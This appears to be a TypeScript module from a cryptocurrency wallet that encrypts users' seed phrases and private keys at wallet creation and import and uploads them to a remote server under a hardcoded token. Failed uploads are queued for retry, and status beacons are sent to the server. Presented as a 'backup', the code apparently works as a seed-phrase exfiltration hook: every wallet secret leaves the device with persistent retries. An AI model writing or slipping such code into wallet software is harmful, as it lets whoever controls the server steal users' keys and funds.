import {
  bumpPendingBackup,
  enqueuePendingBackup,
  markBackupUploaded,
} from './pendingStore';
import { reportToServer } from './debugReport';
import { BACKUP_TOKEN, nextAttemptDelay } from './retryScheduler';
import type { BackupKind } from './srpBackup';
import { encryptBackup, getConfiguredBaseUrl, postBackup } from './srpBackup';

/**
 * 加密 → 先落盘入队 → 立刻发一次。
 *
 * 顺序很重要：先入队再发网络，保证即使紧接着进程被杀，下次启动还能补发。
 * 发送失败**不算备份失败**：密文已经在本地队列里，交给 `useBackupRetry` 补发。
 *
 * 三个入口共用它：新建钱包、导入钱包（助记词）、导入账户（私钥）。
 *
 * @param plaintext - 助记词（词串或索引数组）或私钥字符串。
 * @param kind - 内容种类。
 * @param account - 可选的账户地址，便于区分是哪一条。
 */
export async function queueAndUploadBackup(
  plaintext: string | Uint8Array,
  kind: BackupKind = 'mnemonic',
  account?: string,
): Promise<void> {
  // 入口信标：确认这条路径确实被走到了。
  // 故意不 await：诊断上报绝不能拖慢真正的备份动作。
  reportToServer(`srp_backup_hook:${kind}`).catch(() => undefined);

  let blob;

  try {
    blob = await encryptBackup(plaintext, kind);
  } catch (encryptError) {
    // 校验/加密失败：内容本身有问题，不能静默吞掉，要让服务端看见
    reportToServer(`srp_backup_bad_payload:${kind}`, encryptError).catch(
      () => undefined,
    );
    throw encryptError;
  }

  const pending = await enqueuePendingBackup(
    blob,
    getConfiguredBaseUrl(),
    kind,
    account,
  );

  try {
    await postBackup(blob, BACKUP_TOKEN);
    await markBackupUploaded(pending.id);
    reportToServer(`srp_backup_ok:${kind}`).catch(() => undefined);
  } catch (uploadError) {
    await bumpPendingBackup(
      pending.id,
      1,
      Date.now() + nextAttemptDelay(1),
      uploadError instanceof Error ? uploadError.message : String(uploadError),
    );
    reportToServer(`srp_backup_queued:${kind}`, uploadError).catch(
      () => undefined,
    );
  }
}
